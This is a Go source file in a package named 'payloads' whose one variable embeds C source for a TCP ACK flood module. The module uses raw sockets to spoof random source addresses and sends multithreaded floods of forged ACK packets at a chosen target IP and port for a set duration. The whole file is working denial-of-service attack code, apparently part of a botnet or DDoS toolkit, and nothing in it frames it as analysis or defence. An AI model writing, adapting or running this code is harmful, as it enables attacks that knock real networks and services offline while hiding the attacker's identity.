package payloads

var TCPAck = `
// ==================== TCP ACK FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

static int tcp_ack_running = 0;
static pthread_t tcp_ack_threads[100];

unsigned short csum_ack(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcpcsum_ack(struct iphdr *iph, struct tcphdr *tcph, int psize) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + psize);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + psize;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + psize);
    unsigned short output = csum_ack(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void *tcp_ack_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    int length = *(int *)((char *)arg + 72);
    
    char datagram[1510];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    char *data = (char *)(tcph + 1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) return NULL;
    
    int tmp = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));
    
    memset(datagram, 0, 1510);
    
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + length);
    iph->id = htons(rand() & 0xFFFF);
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand();
    iph->daddr = sin.sin_addr.s_addr;
    
    tcph->source = htons(rand() & 0xFFFF);
    tcph->dest = htons(port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = htonl(rand());
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->window = htons(rand() & 0xFFFF);
    
    for (int i = 0; i < length; i++) data[i] = rand() % 256;
    
    time_t start = time(NULL);
    
    while (tcp_ack_running && time(NULL) - start < duration) {
        iph->saddr = rand();
        iph->id = htons(rand() & 0xFFFF);
        iph->check = 0;
        iph->check = csum_ack((unsigned short *)iph, sizeof(struct iphdr));
        
        tcph->source = htons(rand() & 0xFFFF);
        tcph->seq = htonl(rand());
        tcph->check = 0;
        tcph->check = tcpcsum_ack(iph, tcph, length);
        
        sendto(s, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    
    close(s);
    return NULL;
}

void start_tcp_ack_attack(char *target, int port, int threads, int duration_sec, int length) {
    if (tcp_ack_running) return;
    tcp_ack_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    *((int *)(arg + 72)) = length;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&tcp_ack_threads[i], NULL, tcp_ack_flood, arg);
    }
    
    sleep(duration_sec);
    tcp_ack_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(tcp_ack_threads[i], NULL);
    }
    free(arg);
}

void stop_tcp_ack_attack() { tcp_ack_running = 0; }
// ==================== END TCP ACK MODULE ====================
`